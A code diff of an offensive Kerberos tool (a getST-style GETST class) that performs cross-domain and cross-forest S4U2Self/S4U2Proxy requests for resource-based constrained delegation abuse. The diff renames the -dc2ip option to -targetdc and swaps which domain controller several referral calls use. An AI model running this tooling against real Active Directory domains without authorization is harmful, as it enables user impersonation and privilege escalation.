@@ -90,7 +90,7 @@ class GETST:
         self.__aesKey = options.aesKey
         self.__options = options
         self.__kdcHost = options.dc_ip
-        self.__otherdcHost = options.dc2ip
+        self.__otherdcHost = options.targetdc
         self.__targetDomain = options.targetdomain
         self.__force_forwardable = options.force_forwardable
         self.__additional_ticket = options.additional_ticket
@@ -526,8 +526,6 @@ class GETST:
         lastticket = Ticket()
         lastticket.from_asn1(tgs['ticket'])
         last = lastticket.to_asn1(TicketAsn1())
-        self.__saveFileName = "2_forest_tgs_s4u2proxy"
-        self.saveTicket(r, sessionKey)
 
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('TGS_REP')
@@ -553,7 +551,7 @@ class GETST:
         logging.debug("Asking for cross-domain TGT")
         target = ("krbtgt/%s@%s" % (self.__targetDomain, self.__domain))
         serverName = Principal(target, type=constants.PrincipalNameType.NT_SRV_INST.value)
-        cross_domtgt, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain, self.__otherdcHost, tgt, cipher, sessionKey, self.__options.renew)
+        cross_domtgt, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain, kdcHost, tgt, cipher, sessionKey, self.__options.renew)
         crossdom_cipher = cipher
         logging.debug("Cross-domain TGT - OK")
 
@@ -567,7 +565,7 @@ class GETST:
         ticket.from_asn1(decodedTGT['ticket'])
 
         targetDomain = self.__targetDomain.upper()
-        r, TGT_sessionKey, newSessionKey = self.doS4U2SelfCrossDomain(ticket, decodedTGT, cipher, sessionKey, kdcHost, targetDomain, False)
+        r, TGT_sessionKey, newSessionKey = self.doS4U2SelfCrossDomain(ticket, decodedTGT, cipher, sessionKey, otherDcHost, targetDomain, False)
 
         logging.debug("Referral S4U2Self - OK")
 
@@ -580,7 +578,7 @@ class GETST:
         ticket.from_asn1(tgs['ticket'])
         
         # We do not need to store the sessionKey, as we will only use the initial TGT and the cross-domain TGT in the authenticator 
-        r, _, _ = self.doS4U2SelfCrossDomain(ticket, decodedTGT, cipher, sessionKey, otherDcHost, str(decodedTGT['crealm']).upper(), False)
+        r, _, _ = self.doS4U2SelfCrossDomain(ticket, decodedTGT, cipher, sessionKey, kdcHost, str(decodedTGT['crealm']).upper(), False)
 
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
 
@@ -605,7 +603,7 @@ class GETST:
         ticket = Ticket()
         ticket.from_asn1(initial_tgt['ticket'])
 
-        r, _, _ = self.doS4UProxyCrossDomain(ticket, initial_tgt, myTicket, init_cipher, init_session_key, otherDcHost, str(decodedTGT['crealm']).upper(), False)
+        r, _, _ = self.doS4UProxyCrossDomain(ticket, initial_tgt, myTicket, init_cipher, init_session_key, kdcHost, str(decodedTGT['crealm']).upper(), False)
 
         logging.debug("Referral S4U2Proxy - OK")
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
@@ -620,7 +618,7 @@ class GETST:
         ticket = Ticket()
         ticket.from_asn1(decodedTGT['ticket'])
 
-        r, oldsess , newsess = self.doS4UProxyCrossDomain(ticket, decodedTGT, myTicket, crossdom_cipher, sessionKey, kdcHost, self.__targetDomain, False)
+        r, oldsess , newsess = self.doS4UProxyCrossDomain(ticket, decodedTGT, myTicket, crossdom_cipher, sessionKey, otherDcHost, self.__targetDomain, False)
         logging.debug("S4U2Proxy - OK")
 
         return r, None, oldsess, None
@@ -1246,26 +1244,14 @@ class GETST:
         if tgt is None:
             # If otherDCHost is not None, and cross-forest is false, we need to obtain a ST for krbtgt on the second domain
              
-            if self.__otherdcHost is not None and not self.__forest:
-                userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-                logging.info('Getting TGT for user crossdom !')
-                logging.info(self.__domain)
-                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
-                                                                        unhexlify(self.__lmhash), unhexlify(self.__nthash),
-                                                                        self.__aesKey,
-                                                                        self.__otherdcHost)
-                logging.debug("TGT session key: %s" % hexlify(sessionKey.contents).decode())
-
-
-            else:
-                # Still no TGT
-                userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-                logging.info('Getting TGT for user')
-                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
-                                                                        unhexlify(self.__lmhash), unhexlify(self.__nthash),
-                                                                        self.__aesKey,
-                                                                        self.__kdcHost)
-                logging.debug("TGT session key: %s" % hexlify(sessionKey.contents).decode())
+            # Still no TGT
+            userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            logging.info('Getting TGT for user')
+            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
+                                                                    unhexlify(self.__lmhash), unhexlify(self.__nthash),
+                                                                    self.__aesKey,
+                                                                    self.__kdcHost)
+            logging.debug("TGT session key: %s" % hexlify(sessionKey.contents).decode())
 
             
 
@@ -1354,7 +1340,7 @@ if __name__ == '__main__':
                                                                           '(128 or 256 bits)')
     group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                             'omitted it use the domain part (FQDN) specified in the target parameter')
-    group.add_argument('-dc2ip', action='store', metavar="ip address", help='IP Address of the second domain controller to use. Necessary '
+    group.add_argument('-targetdc', action='store', metavar="ip address", help='IP Address of the second domain controller to use. Necessary '
                                                                             'for cross-domain/forest RBCD')
     group.add_argument('-targetdomain', action='store', metavar="ip address", help='Second domain to target. Necessary for cross-domain/forest RBCD')
     parser.add_argument('-forest', dest='forest', action='store_true', help='For cross-forest RBCD')
